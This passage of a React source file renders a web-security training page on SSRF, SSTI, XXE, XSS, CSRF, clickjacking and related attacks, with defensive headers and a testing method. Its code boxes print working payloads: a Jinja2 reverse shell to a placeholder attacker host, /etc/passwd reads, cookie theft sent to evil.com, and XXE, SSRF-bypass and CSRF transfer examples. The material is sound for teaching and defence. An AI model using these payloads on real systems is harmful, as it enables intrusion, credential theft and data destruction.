                backend systems, databases, internal services, and cloud infrastructure. The impact can range from data exfiltration to complete
                infrastructure takeover, making them some of the most severe vulnerabilities in modern applications.
              </Typography>
            </Paper>

            {/* Attack Surface Categories */}
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
              Server-Side Attack Surface
            </Typography>
            <Grid container spacing={2} sx={{ mb: 4 }}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2, height: "100%" }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#dc2626", mb: 2 }}>
                     Direct Server Exploitation
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "Server-Side Template Injection (SSTI) - Execute code via template engines",
                      "Server-Side Request Forgery (SSRF) - Force server to make arbitrary requests",
                      "XML External Entity (XXE) - Exploit XML parsers for file disclosure",
                      "Deserialization Attacks - Execute code via unsafe deserialization",
                      "File Upload Exploits - Upload malicious files to execute code",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                        <ListItemIcon sx={{ minWidth: 28 }}>
                          <CheckCircleIcon sx={{ fontSize: 16, color: "#dc2626" }} />
                        </ListItemIcon>
                        <ListItemText
                          primary={item}
                          primaryTypographyProps={{ variant: "body2", color: "text.secondary" }}
                        />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b", mb: 2 }}>
                     Infrastructure & Cloud Attacks
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "Cloud Metadata Exploitation - Access AWS/Azure/GCP metadata APIs",
                      "Internal Network Pivoting - Use SSRF to scan internal networks",
                      "Container Escape - Break out of Docker/Kubernetes containers",
                      "Server-Side Prototype Pollution - Modify JavaScript prototypes",
                      "DNS Rebinding - Bypass same-origin via DNS tricks",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                        <ListItemIcon sx={{ minWidth: 28 }}>
                          <CheckCircleIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                        </ListItemIcon>
                        <ListItemText
                          primary={item}
                          primaryTypographyProps={{ variant: "body2", color: "text.secondary" }}
                        />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>

            {/* SSRF Deep Dive */}
            <Alert severity="error" sx={{ mb: 4 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                 SSRF: The Cloud Hacker's Swiss Army Knife
              </Typography>
              <Typography variant="body2" paragraph>
                Server-Side Request Forgery (SSRF) has become one of the most dangerous vulnerabilities in cloud environments. In AWS,
                accessing <code style={{background: alpha("#dc2626", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://169.254.169.254/latest/meta-data/</code>
                can expose IAM credentials, allowing an attacker to escalate from a simple SSRF to full AWS account compromise.
              </Typography>
              <Typography variant="body2" fontWeight={600} color="#dc2626">
                Real-world impact: Capital One breach (2019) - SSRF led to 100 million records stolen via cloud metadata exploitation.
              </Typography>
            </Alert>

            {/* Common Bypass Techniques */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                Common SSRF Bypass Techniques
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
                      URL Encoding Tricks
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem" }}>
                       Use decimal: <code>http://2130706433/</code> (127.0.0.1)<br/>
                       Use hex: <code>http://0x7f000001/</code><br/>
                       Use octal: <code>http://0177.0.0.1/</code><br/>
                       URL encoding: <code>http://127.0.0.1%00.example.com/</code>
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                      DNS Rebinding
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem" }}>
                       Create a domain that resolves to external IP first<br/>
                       Then changes TTL to 0 and resolves to internal IP<br/>
                       Server validates external, then requests internal<br/>
                       Tools: <code>rebind.network</code>, <code>1u.ms</code>
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                      Redirect Chains
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem" }}>
                       Host a URL that redirects to internal service<br/>
                       <code>http://evil.com/redir  http://localhost:6379/</code><br/>
                       Bypasses simple blocklist filters<br/>
                       Works if app follows redirects blindly
                    </Typography>
                  </Box>
                </Grid>
              </Grid>
            </Paper>

            {/* Template Injection Fundamentals */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
                Server-Side Template Injection (SSTI)
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                SSTI occurs when user input is embedded into template engines (Jinja2, Twig, FreeMarker, Velocity) without proper sanitization.
                Unlike XSS which executes in the browser, SSTI executes on the server, often leading to Remote Code Execution (RCE).
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    Detection Payloads
                  </Typography>
                  <Box component="pre" sx={{ p: 2, bgcolor: "#000", borderRadius: 1, fontSize: "0.8rem", overflowX: "auto" }}>
{`# Math detection
{{7*7}}            49 (Jinja2, Twig)
\${7*7}            49 (FreeMarker)
<%= 7*7 %>         49 (ERB)
#set($x=7*7)$x     49 (Velocity)`}
                  </Box>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    RCE Payloads (Jinja2 Example)
                  </Typography>
                  <Box component="pre" sx={{ p: 2, bgcolor: "#000", borderRadius: 1, fontSize: "0.8rem", overflowX: "auto" }}>
{`# Read /etc/passwd
{{''.__class__.__mro__[1].__subclasses__()[396]
  ('cat /etc/passwd',shell=True,stdout=-1).
   communicate()}}

# Reverse shell
{{config.__class__.__init__.__globals__
  ['os'].popen('bash -c "bash -i >&
   /dev/tcp/attacker/4444 0>&1"').read()}}`}
                  </Box>
                </Grid>
              </Grid>
            </Paper>

            {/* XXE Attacks */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                XML External Entity (XXE) Attacks
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                XXE exploits vulnerable XML parsers to read files, trigger SSRF, cause denial of service, or even achieve RCE in some configurations.
                It's especially common in SOAP APIs, SVG uploads, and document parsers (DOCX, XLSX, PDF).
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                       File Disclosure
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.75rem", overflowX: "auto" }}>
{`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
   "file:///etc/passwd">
]>
<root>&xxe;</root>`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                       SSRF via XXE
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.75rem", overflowX: "auto" }}>
{`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
   "http://internal.svc:8080/admin">
]>
<root>&xxe;</root>`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
                       Billion Laughs DoS
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.75rem", overflowX: "auto" }}>
{`<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;">
  ...
  <!ENTITY lol9 "&lol8;&lol8;">
]>
<root>&lol9;</root>`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* Testing Methodology */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                Server-Side Testing Methodology
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={3}>
                  <Box sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ color: "#3b82f6", fontWeight: 700, mb: 0.5 }}>
                      1. Discover
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Identify input points that interact with backend systems: URL parameters, file uploads, XML/JSON parsers, webhooks
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Box sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ color: "#22c55e", fontWeight: 700, mb: 0.5 }}>
                      2. Probe
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Send detection payloads for each attack type. Look for error messages, timing differences, or successful execution
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ color: "#f59e0b", fontWeight: 700, mb: 0.5 }}>
                      3. Exploit
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Craft exploit payloads to demonstrate impact: read sensitive files, access cloud metadata, execute commands
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={3}>
                  <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 0.5 }}>
                      4. Document
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      Capture full request/response, explain the vulnerability chain, and provide clear remediation steps
                    </Typography>
                  </Box>
                </Grid>
              </Grid>
            </Paper>

            <TopicAccordion topics={serverSideTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* Client-Side Attacks Section */}
        <Box id="client-side" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#f59e0b", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Advanced Client-Side Attacks
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Client-side attacks target users' browsers to steal credentials, perform actions, or
              pivot to other attacks.
            </Typography>

            {/* Why Client-Side Attacks Matter */}
            <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#f59e0b", 0.03), border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                Why Client-Side Attacks Matter
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                While server-side attacks compromise the infrastructure, client-side attacks compromise the users themselves. These vulnerabilities
                execute malicious code in victims' browsers, allowing attackers to steal session tokens, perform actions on behalf of users, capture
                keystrokes, exfiltrate data, and pivot to more devastating attacks. The impact is immediate and widespread because every user who
                visits a compromised page becomes a potential victim.
              </Typography>
              <Typography variant="body2" color="text.secondary">
                Modern web applications are increasingly client-heavy with JavaScript frameworks (React, Vue, Angular) handling authentication,
                routing, and data management in the browser. This expanded attack surface means that client-side vulnerabilities can be just as
                critical as server-side ones, especially when combined with techniques like CSRF, clickjacking, and DOM-based attacks.
              </Typography>
            </Paper>

            {/* XSS: The King of Client-Side Attacks */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
                Cross-Site Scripting (XSS): The Most Common Client-Side Vulnerability
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. Once the script executes in a victim's
                browser, it runs with the same privileges as the legitimate application code, giving the attacker full access to the DOM, cookies,
                localStorage, sessionStorage, and the ability to perform actions as the victim.
              </Typography>

              <Grid container spacing={2} sx={{ mb: 3 }}>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                       Reflected XSS
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Payload is reflected immediately in the response, typically via URL parameters or form inputs. Requires social engineering
                      to trick users into clicking malicious links.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`https://site.com/search?q=
<script>fetch('//evil.com?c='
+document.cookie)</script>`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                       Stored XSS
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Payload is permanently stored on the server (database, comment system, profile) and served to all users who view the content.
                      Most dangerous type due to persistent impact.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`// Stored in user profile bio
<img src=x onerror="
  fetch('/admin/delete?id=all'
  ,{credentials:'include'})
">`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
                       DOM-based XSS
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Vulnerability exists entirely in client-side JavaScript. The payload never reaches the server, making it harder to detect
                      with traditional scanning tools.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`// Vulnerable code
element.innerHTML =
  location.hash.substring(1);

// Attack: #<img src=x
// onerror=alert(document.domain)>`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>

              <Alert severity="warning" sx={{ mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>
                  Modern XSS Bypass Techniques
                </Typography>
                <Typography variant="body2">
                  Filters blocking <code>&lt;script&gt;</code>? Try: <code>&lt;img src=x onerror=alert(1)&gt;</code>,
                  <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=alert(1)&gt;</code>,
                  <code>&lt;iframe src="javascript:alert(1)"&gt;</code>, or event handlers like <code>onfocus</code>, <code>oninput</code>, <code>onmouseover</code>
                </Typography>
              </Alert>

              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    What Can You Do With XSS?
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "Steal session cookies: document.cookie",
                      "Steal tokens from localStorage/sessionStorage",
                      "Perform actions as the victim (CSRF without tokens)",
                      "Keylog user input on the page",
                      "Redirect to phishing page",
                      "Inject fake login forms",
                      "Deface the website for that user",
                      "Use as pivot point for internal network attacks",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ fontSize: 14, color: "#dc2626" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    XSS Detection Strategy
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "1. Identify all user input reflection points",
                      "2. Test with benign payloads: <randomstring123>",
                      "3. Check if HTML entities are encoded",
                      "4. Test context: HTML, attribute, JavaScript, CSS",
                      "5. Try encoding bypass: URL, HTML, Unicode, hex",
                      "6. Use polyglot payloads for efficiency",
                      "7. Check Content-Security-Policy headers",
                      "8. Test DOM sinks: innerHTML, eval(), setTimeout()",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ fontSize: 14, color: "#f59e0b" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>
            </Paper>

            {/* CSRF Explained */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                Cross-Site Request Forgery (CSRF): Silent Action Hijacking
              </Typography>
              <Typography variant="body2" paragraph color="text.secondary">
                CSRF exploits the trust a website has in a user's browser. If a user is authenticated to a site and visits a malicious page,
                that page can trigger requests to the trusted site using the victim's session cookies. The attack works because browsers
                automatically include cookies with every request to a domain, regardless of where the request originates.
              </Typography>

              <Grid container spacing={2} sx={{ mb: 3 }}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                      How CSRF Works (Step-by-Step)
                    </Typography>
                    <Box sx={{ pl: 1 }}>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 0.5 }}>
                        <strong>1.</strong> Victim logs into bank.com, receives session cookie
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 0.5 }}>
                        <strong>2.</strong> While still logged in, victim visits evil.com
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 0.5 }}>
                        <strong>3.</strong> evil.com contains hidden form targeting bank.com
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 0.5 }}>
                        <strong>4.</strong> Form auto-submits to bank.com/transfer
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 0.5 }}>
                        <strong>5.</strong> Browser includes victim's cookies automatically
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem" }}>
                        <strong>6.</strong> Bank processes request as legitimate (money transferred!)
                      </Typography>
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                      CSRF Attack Example
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`<!-- evil.com hosts this -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer"
        method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
</body>
</html>

<!-- Or via image tag -->
<img src="https://bank.com/delete?id=123"
     style="display:none">`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>
                Testing for CSRF Vulnerabilities
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                    <Typography variant="body2" sx={{ fontWeight: 600, mb: 0.5, color: "#dc2626" }}>
                      1. Identify State-Changing Actions
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Password change, email update, money transfer, profile deletion, privilege escalation, settings modification
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                    <Typography variant="body2" sx={{ fontWeight: 600, mb: 0.5, color: "#f59e0b" }}>
                      2. Check for CSRF Protections
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Look for anti-CSRF tokens in forms/headers, SameSite cookie attribute, Referer header validation, custom headers requirement
                    </Typography>
                  </Box>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                    <Typography variant="body2" sx={{ fontWeight: 600, mb: 0.5, color: "#8b5cf6" }}>
                      3. Craft PoC Attack
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      Create HTML page with form/fetch request, remove/modify CSRF tokens, test if action executes, document in report
                    </Typography>
                  </Box>
                </Grid>
              </Grid>
            </Paper>

            {/* Modern Client-Side Threats */}
            <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                Modern Client-Side Attack Vectors
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
                       Clickjacking / UI Redressing
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Overlay invisible iframe over legitimate-looking page. User thinks they're clicking "Play Video" but actually clicking
                      "Delete Account" on the hidden iframe beneath.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`<iframe src="https://bank.com/transfer"
  style="opacity:0; position:absolute;
  width:100%; height:100%; z-index:999">
</iframe>
<button>Click for free gift!</button>

Defense: X-Frame-Options: DENY`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                       Prototype Pollution (Client-Side)
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Modify JavaScript object prototypes to inject properties into all objects. Can lead to XSS, authentication bypass,
                      or DoS when application logic depends on prototype chain.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`// Vulnerable merge function
merge({}, JSON.parse(userInput))

// Payload
{"__proto__": {"isAdmin": true}}

// Result: ALL objects now have isAdmin`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                       PostMessage Vulnerabilities
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      Cross-window communication via postMessage() without origin validation. Attacker iframe can send malicious messages
                      to parent window, potentially executing code or stealing data.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`// Vulnerable listener
window.addEventListener('message', (e) => {
  eval(e.data.code); // NO origin check!
});

// Attack from evil.com iframe
parent.postMessage({code: 'steal()'}, '*');`}
                    </Box>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                       WebSocket Hijacking
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ fontSize: "0.85rem", mb: 1 }}>
                      WebSockets often lack CSRF protection. Attacker page can open WebSocket to victim site using victim's cookies,
                      sending/receiving messages in real-time as the authenticated user.
                    </Typography>
                    <Box component="pre" sx={{ p: 1.5, bgcolor: "#000", borderRadius: 1, fontSize: "0.7rem", overflowX: "auto" }}>
{`// From evil.com
var ws = new WebSocket(
  'wss://bank.com/socket');
ws.onopen = () => {
  ws.send('{"action":"transfer",
    "amount":10000}');
};`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* Client-Side Security Headers */}
            <Alert severity="info" sx={{ mb: 4 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                 Essential Client-Side Security Headers
              </Typography>
              <Grid container spacing={1}>
                <Grid item xs={12} md={6}>
                  <Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>
                    <strong>Content-Security-Policy:</strong> default-src 'self'; script-src 'self' 'nonce-random123'
                  </Typography>
                  <Typography variant="caption" color="text.secondary">
                    Prevents XSS by controlling what resources can load
                  </Typography>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>
                    <strong>X-Frame-Options:</strong> DENY or SAMEORIGIN
                  </Typography>
                  <Typography variant="caption" color="text.secondary">
                    Prevents clickjacking by blocking iframe embedding
                  </Typography>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>
                    <strong>Set-Cookie:</strong> sessionid=...; Secure; HttpOnly; SameSite=Strict
                  </Typography>
                  <Typography variant="caption" color="text.secondary">
                    HttpOnly prevents XSS cookie theft, SameSite prevents CSRF
                  </Typography>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>
                    <strong>Referrer-Policy:</strong> strict-origin-when-cross-origin
                  </Typography>
                  <Typography variant="caption" color="text.secondary">
                    Controls how much referrer information is sent with requests
                  </Typography>
                </Grid>
              </Grid>
            </Alert>

            <TopicAccordion topics={clientSideTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* HTTP Smuggling Section */}
        <Box id="smuggling" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#10b981", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               HTTP Request Smuggling
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Request smuggling exploits discrepancies in how servers parse HTTP requests, enabling
              cache poisoning, credential theft, and security bypass.
            </Typography>
            <TopicAccordion topics={smugglingTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* NEW: API Security Testing Section */}
        <Box id="api-testing" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#06b6d4", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <HttpIcon sx={{ color: "#06b6d4" }} />
              API Security Testing
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Modern applications heavily rely on APIs. Testing REST, GraphQL, and WebSocket APIs requires
              specialized techniques beyond traditional web testing.
            </Typography>

